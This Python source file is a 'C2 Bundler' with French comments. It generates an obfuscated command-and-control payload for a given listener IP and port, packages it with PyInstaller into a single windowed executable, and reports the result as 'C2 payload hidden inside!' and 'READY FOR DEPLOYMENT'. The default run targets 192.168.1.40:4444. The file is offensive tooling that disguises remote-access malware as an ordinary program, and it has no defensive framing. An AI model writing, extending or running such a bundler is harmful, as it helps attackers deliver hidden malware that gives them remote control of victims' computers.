#!/usr/bin/env python3
"""
Complete C2 Bundler - Full Featured
- Payload generation with obfuscation
- PyInstaller bundling
- Cross-platform support (Windows/macOS/Linux)
- Upload support for custom payloads
"""

import os
import sys
import subprocess
import tempfile
import json
import base64
from pathlib import Path
from typing import Optional, Dict, Any


class C2Bundler:
    """Bundler complet avec support upload et personnalisation"""

    def __init__(self):
        self.dist_dir = Path.cwd() / "dist"
        self.dist_dir.mkdir(exist_ok=True)

    def generate_payload(
        self, listener_ip: str, listener_port: int, obfuscation_level: int
    ) -> str:
        """Génère le payload C2 complet"""
        sys.path.insert(0, str(Path(__file__).parent))
        from c2_payload_complete import C2PayloadGenerator

        print(f"[*] Generating C2 payload...")
        print(f"[*] Listener: {listener_ip}:{listener_port}")
        print(f"[*] Obfuscation Level: {obfuscation_level}")

        generator = C2PayloadGenerator(listener_ip, listener_port, obfuscation_level)
        payload_code = generator.generate()
        print(f"[+] Payload generated ({len(payload_code)} bytes)")
        return payload_code

    def save_payload(self, payload_code: str) -> str:
        """Sauvegarde le payload dans un fichier temporaire"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(payload_code)
            temp_file = f.name
        print(f"[+] Temp file: {temp_file}")
        return temp_file

    def bundle_with_pyinstaller(
        self, temp_file: str, platform: str = "windows"
    ) -> bool:
        """Exécute PyInstaller pour créer l'executable"""
        print(f"[*] Running PyInstaller (this may take 30-60 seconds)...")
        print(f"[*] Target platform: {platform}")

        output_name = "c2_payload"
        cmd = [
            "pyinstaller",
            "--onefile",
            "--distpath",
            str(self.dist_dir),
            "--specpath",
            str(self.dist_dir / "specs"),
            "--workpath",
            str(self.dist_dir / "build"),
            "--name",
            output_name,
        ]

        # Platform-specific options
        if platform == "windows":
            cmd.extend(["--windowed"])

        cmd.append(temp_file)

        print(f"[*] Command: {' '.join(cmd)}")

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=300
            )

            if result.stdout:
                print(f"[*] PyInstaller stdout:\n{result.stdout}")
            if result.stderr:
                print(f"[*] PyInstaller stderr:\n{result.stderr}")

            if result.returncode != 0:
                print(
                    f"[!] PyInstaller failed with return code {result.returncode}"
                )
                return False

            return True

        except subprocess.TimeoutExpired:
            print(f"[!] PyInstaller timeout (300s)")
            return False
        except Exception as e:
            print(f"[!] Error running PyInstaller: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False
        finally:
            # Cleanup temp file
            try:
                os.unlink(temp_file)
            except:
                pass

    def verify_executable(self, platform: str = "windows") -> bool:
        """Vérifie que l'executable a été créé correctement"""
        output_name = "c2_payload"

        # Sur macOS, PyInstaller crée un binaire macOS même si on demande Windows
        # Pour Windows, utiliser GitHub Actions
        if platform == "windows":
            # Cherche .exe d'abord (depuis Windows)
            exe_path = self.dist_dir / f"{output_name}.exe"
            if not exe_path.exists():
                # Fallback: cherche binaire macOS (création sur macOS)
                exe_path = self.dist_dir / output_name
        else:
            exe_path = self.dist_dir / output_name

        if exe_path.exists():
            size_mb = exe_path.stat().st_size / 1024 / 1024
            print(f"[+] Executable created: {exe_path}")
            print(f"[+] Size: {size_mb:.2f} MB")
            print(f"[+] C2 payload hidden inside!")
            
            # Vérifier que c'est un vrai exécutable
            if exe_path.stat().st_mode & 0o111:
                print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
                return True
            else:
                print(f"[!] Not executable (permissions)")
                return False
        else:
            print(f"[!] Executable not found at {exe_path}")
            if self.dist_dir.exists():
                print(f"[!] Contents of dist: {list(self.dist_dir.iterdir())}")
            return False

    def create_bundled_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        platform: str = "windows",
    ) -> bool:
        """Process complet: génération + bundling + vérification"""
        try:
            # Step 1: Generate payload
            payload_code = self.generate_payload(
                listener_ip, listener_port, obfuscation_level
            )

            # Step 2: Save payload
            temp_file = self.save_payload(payload_code)

            # Step 3: Bundle with PyInstaller
            if not self.bundle_with_pyinstaller(temp_file, platform):
                print("[!] FAILED: PyInstaller bundling failed")
                return False

            # Step 4: Verify executable
            if not self.verify_executable(platform):
                print("[!] FAILED: Executable verification failed")
                return False

            print(
                f"[+] SUCCESS: C2 payload bundled successfully for {platform}!"
            )
            return True

        except Exception as e:
            print(f"[!] FAILED: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False


def create_bundled_payload(
    listener_ip: str,
    listener_port: int,
    obfuscation_level: int,
    platform: str = "windows",
) -> bool:
    """Fonction compatibilité - utilisée par bundler_tab.py et GitHub Actions"""
    bundler = C2Bundler()
    return bundler.create_bundled_payload(
        listener_ip, listener_port, obfuscation_level, platform
    )


if __name__ == "__main__":
    # Test avec configuration par défaut
    success = create_bundled_payload("192.168.1.40", 4444, 2, "windows")
    sys.exit(0 if success else 1)
